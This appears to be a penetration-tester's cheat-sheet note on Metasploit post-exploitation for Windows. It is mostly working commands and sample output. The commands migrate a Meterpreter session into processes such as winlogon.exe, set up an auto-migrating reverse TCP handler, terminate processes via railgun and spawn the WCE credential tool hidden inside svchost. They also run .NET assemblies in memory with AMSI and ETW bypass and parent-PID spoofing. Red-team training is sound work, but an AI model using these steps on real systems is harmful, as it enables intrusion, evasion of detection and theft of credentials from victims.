---
author(s):
  - Userware
tags:
  - post-exploitation
  - defense-evasion
  - process-injection
  - metasploit-framework
  - windows
---
# Metasploit

## 01 - Migrate Process

```
meterpreter > migrate <pid>

meterpreter > migrate -P <pid>

meterpreter > migrate -N <process_name>

meterpreter > migrate -N winlogon.exe
[*] Migrating from 4980 to 412...
[*] Migration completed successfully.
```

## 02 - Auto Migrate to Another Process

Setting up listener to auto migrate to another process.

```
msf exploit(multi/handler) > set lhost 10.0.2.4

msf exploit(multi/handler) > set lport 4444

msf exploit(multi/handler) > set autorunscript post/windows/manage/migrate name=notepad.exe

msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] Sending stage (200262 bytes) to 10.0.2.15
[*] Session ID 4 (10.0.2.4:4444 -> 10.0.2.15:49840 ) processing AutoRunScript 'post/windows/manage/migrate name=notepad.exe'
[*] Running module against DEFALT
[*] Current server process: powershell.exe (1136)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 1280
[+] Successfully migrated into process 1280
[*] Meterpreter session 4 opened (10.0.2.4:4444 -> 10.0.2.15:49840 ) at 2022-05-15 15:35:51 -0400
```

Check the process identifer.

```
meterpreter > getpid
Current pid: 1280
```

TODO: Fill this info

```
msf > use post/windows/manage/priv_migrate
```

```
msf > use post/windows/manage/archmigrate
```

## 03 - Terminate Process

### 3.1 - Process ID

Terminate process ID.

![[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/03 - Process Manipulation/Linux/C2 Frameworks/Metasploit#^ce813b]]

We'll create a new handle by retrieving the process ID. Then define a process handle `_['return']` after the conditions has been met. Terminate by calling the railgun function with zero exit code as an indication the process has been killed.

```
meterpreter > irb

>> client.railgun.kernel32.OpenProcess("PROCESS_TERMINATE", false, <pid>)

>> process_handle = _['return'] -> define a process handle

>> client.railgun.kernel32.TerminateProcess(process_handle, 0)
```

### 3.2 - Process Name

![[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/03 - Process Manipulation/Linux/C2 Frameworks/Metasploit#^365cba]]

## 04 - Inject Process

### 4.1 - Execute Process

Spawn a executable program as a dummy process with `-d` flag.

```
meterpreter > execute -Hicmd svchost.exe -f /usr/share/windows-resources/wce/wce64.exe -a "-h"
```

### 4.2 - .NET CLR Assembly

```
msf > use post/windows/manage/execute_dotnet_assembly

msf post(windows/manage/execute_dotnet_assembly) > options

Module options (post/windows/manage/execute_dotnet_assembly):

  Name            Current Setting  Required  Description
  ----            ---------------  --------  -----------
  AMSIBYPASS      true             yes       Enable Amsi bypass
  ARGUMENTS                        no        Command line arguments
  DOTNET_EXE                       yes       Assembly file name
  ETWBYPASS       true             yes       Enable Etw bypass
  PID             0                no        Pid  to inject
  PPID            0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)
  PROCESS         notepad.exe      no        Process to spawn
  SESSION                          yes       The session to run this module on
  Signature       Automatic        yes       The Main function signature (Accepted: Automatic, Main(), Main(string[]))
  USETHREADTOKEN  true             no        Spawn process with thread impersonation
  WAIT            10               no        Time in seconds to wait


View the full module info with the info, or info -d command.

msf post(windows/manage/execute_dotnet_assembly) > set dotnet_exe /path/to/compiled_dotnet_tool.exe

msf post(windows/manage/execute_dotnet_assembly) > set arguments [arguments]

msf post(windows/manage/execute_dotnet_assembly) > set signature <Automatic | Main() | Main(string[])>

msf post(windows/manage/execute_dotnet_assembly) > set amsibypass <true | false>

msf post(windows/manage/execute_dotnet_assembly) > set etwbypass <true | false>

msf post(windows/manage/execute_dotnet_assembly) > set process [process_name.exe]

msf post(windows/manage/execute_dotnet_assembly) > set pid [process_ID]

msf post(windows/manage/execute_dotnet_assembly) > set ppid [<parent_process_ID>]

msf post(windows/manage/execute_dotnet_assembly) > set usethreadtoken [true | false]

msf post(windows/manage/execute_dotnet_assembly) > set wait [seconds]

msf post(windows/manage/execute_dotnet_assembly) > set session <session_ID>

msf post(windows/manage/execute_dotnet_assembly) > run
```

`meterpeter` one-liner execution.

```
meterpreter > run post/windows/manage/execute_dotnet_assembly dotnet_exe=/path/to/compiled_dotnet_tool.exe [arguments="<arguments>"] signature=<Automatic | Main() | Main(string[])> set amsibypass=<true | false> etwbypass=<true | false> [process=<process_name>.exe] [pid=<process_ID>] [ppid=<parent_process_ID>] [usethreadtoken=<true | false>] [wait=<seconds>]
```

---
## References

### Hacking Articles

- [Hacking Articles: Metasploit for Pentester Migrate](https://www.hackingarticles.in/metasploit-for-pentester-migrate/)

### Pentestlab

- [Pentestlab: Parent PID Spoofing](https://pentestlab.blog/2020/02/24/parent-pid-spoofing/)